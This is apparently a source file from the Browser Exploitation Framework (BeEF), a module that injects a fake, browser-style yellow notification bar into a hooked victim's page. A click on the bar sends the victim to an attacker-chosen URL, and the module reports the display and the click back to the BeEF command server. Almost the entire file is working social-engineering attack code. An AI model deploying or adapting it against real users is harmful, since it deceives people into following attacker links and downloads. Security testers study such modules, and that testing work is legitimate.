//
// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var id = beef.dom.generateID();
	var pid = beef.dom.generateID();
	var zztop = beef.dom.getHighestZindex()+1;
	var el = beef.dom.createElement('div',{'id':id,'style':'width:100%; position:fixed; top:0px; left:0px; margin:0; padding:0px 20px 0px 20px; z-index:'+zztop+'; border-bottom:1px solid black; background:#fbe99a; display:none;'});
	var ell = beef.dom.createElement('div',{'style':'width: 16px; height: 18px; padding: 0; margin: 3px 0px 5px 5px; position: absolute; left: 0px; top: 0px; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAWCAIAAACkFJBSAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAK3SURBVDhPpZD7T1JhHMbPn1NbrdvKmpmtieJdyBuCXA/e8IJRDtOJiEpkNUzEG6QCivWDrlroxDnNbtqWzqwxMZU0jyDayi6uA1vfRF/PUn9i++zsOS/P8+EFzL/xKHgw/8bDw/CtH/rRfxPMD9UD6CEcrY+t8vEh9eay+ZDO3hAs1v38Isy6O1nnQ47Hx4RODGsO7FAPwdK9ny13d0dLKSOJXiDhLs6YDuxQDzG/twsx+Vxj7ysfsylf9Kssxoq8HN6t6uLJsXtvh2vh8PWg6pvLSO2jjPm8lh3WLMqbvNMnjwJnzxyjR4ZzOSlXGdF02oVLoSdPnTjCSLjsfHd/r4+GXgtYzAHINXNVRV58bAQjkZ7MjGWzmLiQnclOhteEOBogyWG73jejPjVgvjVTANLTqVZJYZmbzReLODlZPAjwDCASZMik+OK0fmFK65ltgjIaQgBLB+JZn66nq2looOf6tVwkAlfAy2Uz61RCLuuKQp5KOHTUIVjaET+I3p/uJ+R6r9WshUsFrhMgW8xlpSVFR4WHh52LooXOvNJQh5jP04542a94M6hcnqmvqykQ8NLh+7PwTNiDBQJc0G7r1KjLGuur3E4DdQgWYwDSbczFk+LoIRI8hpkYKeSny0sKbsgkYhEbFPCsKCv84jBtrg5uErZ/f8ruEAJGegw7uA0qRX4ULSwy4mJaSry+oXbBYf84ZVNXl+LCDLAU5fPnp7Sk58E2u6vtgJHuNoTJUMnlJAt4abDp7a78vdK26tDfrpGKBCwQCfmpjok6ah9lsLQiRge0JbI8+P3FRWLdXal3TjduV/I4DGkhriiXqavlrukGah9ljFxtQXxfti7NDS/NjXx2jhCfnm6tGL+6umY/jLico8T8kGexf4top/ZRBktz8IBFHzwYSTQGD/aHaAwesDQEz1/qC1RvBXP1zgAAAABJRU5ErkJggg==);'});
	var elr = beef.dom.createElement('div',{'style':'width: 8px; height: 8px; padding: 0; margin: 7px 50px 5px 0px; position: absolute; right: 0px; top: 0px; background-image: url(data:image/png;base64,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);'})
	var elp = beef.dom.createElement('div',{'id':pid,'style':'margin: 2px 50px 0 4px; height: 25px; line-height: 25px; font-family: sans-serif; font-size: 12px; padding-bottom: 5px'});
	$j('body').append(el);
	var hid = '#'+id;
	var hpid = '#'+pid;
	$j(hid).append(elp);
	$j(hpid).html("<%= @notification_text %>&nbsp;<img style='padding:0; margin:5px; position: absolute; top: 0;' src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFUAAAAXCAIAAAD1B5RqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAfBSURBVFhH5ZJZUFP3Hsfz3qf7fKdPzn3oTGu9MxaX2lrEIlAMjoreUSGBqwGRAHeQQBAkYVW2avEKElRIQIIJS5MQgtlDciAbJCRkIywJS04CZGFLhATvIdFMx9va2oe+ZObz8D3/8/t9v//vmQPz2cna0YdsegODWhc58AcbTcr/7jh6YOaJRzJRh3d97s2uPXJwr+gBXsuSgQCTcqttFumbHVtEsbdjM04y9bIHMGC40rEoe7OzGGmYNENTY41Q/wrHgvTN64VIw6RhTo01QP3L7Qtje68tkYZJw5gaq4cBLLzdKt7zzUQapkna1GgdTMLC2a2iPd80RGBLN9qJwWIy7zY8cQVP/hy76xoOuXrcrAmKGkh82MdlHqT0PV9ZM/yJuB23it5U0DvC8X7kbY2TA1OjtcH+FuGe17jPtn6GWZnwzdc1PVRv6OS3Wefhsu+3u39twLcqxyOOEUWyfYE8ThLJPmxlFf6EzLppsmo+PParb/2bU7OKvul5xe7vXfi9daO6Xxvsf9du4e1t60J41B1I+A9UpWBjiTulYurFXSzaM/mkwLup23PJ9EAni9Y2ImZYDYNMfPyhRBSF/7NnTbVq7OfSCCz6U9mE6PW2zrcyhkccJQoB38oo9CFIQiDs799QTyspc1qmiPWUxewyzUr92zqr4AEyK8NkGXfND+s0Qh+Uta4wy+gLKxPQottMFzAJ0LBG3gtM8MNWIeFfV00rqcvg5K5HqpdSdfJ+HqNNDDDdnreN3psPPxrVVC1wD+pfap/n7G1pQnjUz5HwBKqSa2DdSfrmaE4BuijjfHxy6pgZMNNLrqdexBZnVxTn97MIDemHDxyJK2l+tGyVsB8i/lOYg7+TchZ+ha0a8a1I9vsLxD7HviAJxWF/n0OMTfh7EiK9EofOu550CV28YFNaBY3ILJRpfgzoykIX1tpdmj1woCI5maDguIz91aiE7IIbVdgMFPzggZSysFVIbC8LSpEnyGLJurUrLerAtVu3cEU3kr6PJo1wd9+Vem8l9GhUvdQCNVD/EnB+OLClCuFRtyHg8RTFsJ6FTYyDc9Qj3vmeOxfhT8QD3B+vZeHqbC7l5hLf41E5KenRmfdWoK2Ncefs8NqqfAtkP846U9r+Yt0hwiOOEAUCr0MYFMKwv9cuzE88gGnp2HKPb5o78s+fbmQyrYJ6ZNZ147wY6MxEY2pApypg6y1PvkhQMOQ9uTeyCmdARcAlYVbGf55SHNia2PUovC6Z1yV/vT6+tcwpRX7dPSL0WImIE/9sog9610Y6MUmFjwnr70qF038pjCqyFqiGSYZKwDlmYFMRwq16gjh7hiJn6ocKM7LzzIuKANh77+p3BS96LKONuQmfwdF3JRLaxqbCSUFGZ1avbCp23K94TzDXzx85fSrq0OdfFLY9d9t5+NQoIp/rfSfC/l6Qi0s9QhJwgyfMtoyzeEqfhX8feTPdOCeUdKLQmEpwTRFYflmefJ4wSqXjLub+2OQK3m2RmnkMVRrYZA/Wp52LORobE99IJa0uDZcijneLeB7L87wLscMaRcAtYlTBU7A1DufbUuH0XwrjRJdWst//DjjLCGxIQ7gnmoP9GfqhgozsXPOCNGCj3LvyXUFXz/6AvZ9cnwaPTXqlFzkpiOjMypUNqUeLiz0Y91I66FsTPMs5VUh45rZz8KlfEflsLwgJ6EOww/5ekI29fKiVGUxcJpcnx9Wy+y28GuTNNOMcT0K6gS6oANekgTliQWJCM9AzUByPKK9dde/fTd+e8lU6NmwVEluLQ8H+HM/802B/acAtYFRC/asdkM+7Xv8vjBMkraQKJh4qBmcHAhtAEIlT/vDaDzHdQJ+OmZ+RjTYvAAEb+d6VkwUd7VP0uzy1wGV5mgv/dkAhcr5MPXoOrXOKXJLbCaf+JZkTrEpxxw/8o5BAcIPD+NTDRP6QF2SFxDt/wGsbyv/2kzM5JfNWrpKKio+/IjNxLLwq5E2EcZar7kefPnt5UscYp6IO/+3gIxl1nJwZfSKBPcnYNraXXfrs00u3w1YhsbVIL0Uc7RaxPPOteRdOD08CAReHUZmYgq0wiXB56HydpqUo5SpXQ2ktuErg08PrhvF2jaQCJmZibeZev0cEsbvGGcDFxsZEwdPy5JKaBw8qFpdFfpBKrkxvZXWPk1EXYqLi4k40DdKgYS9IrrocFfvvLIOO1lf2PbR1Donua8tuo5HW7SxS9dVXcpbPziJWX2UrWCF/iO0lRlnKFzm3rlyKi4q9dLFf0AcdgvJHdY1Yq5Xn99CY9SnnYo7l5GfX4nIGtVDQq9E2VPL+cPLD2wkns0vCVm8Nlwfba1J546yNBVLzXZTcJPI72aPEW/dbm+aA8mIMxqBtwWcghdqejlJEh2ggvG5QPtOIy6H+RTYzxe/h/zVsL9HKUg4TeVCxj0xc6GnOPHO7q/WjF38jyKBsC/cn+92cv4btpb6KtKgufv8fjLONNeQnf3nyxJcno6Iyy7DT4NAfXPzdMYOiVSPGw8SDGNv0C797ONIwKFo0Izjo/8fYTCS/ixlpGOSPNSNlMCW3eEbV7F+j+dfokcPOys8aSYNJioc5DHW8gdtGxU9z6pbIQTvaIGJgnDONsB1bk8NQqxbekbOLIgetuNRproe6/w+d8pi6IL886wAAAABJRU5ErkJggg=='>");
	$j(hid).append(ell);
	//$j(hid).append("<u>Problems installing?</u>&nbsp;");
	$j(hid).append(elr);
	$j(hid).click(function() {
		$j(this).slideUp(300,function() {
			$j(this).remove();
		});
		window.location = '<%= @url %>';
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=User has clicked the notification');
	});
	$j(hid).css('cursor','pointer');
	$j(hid).slideDown(300,function() {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Notification has been displayed');
	});

});
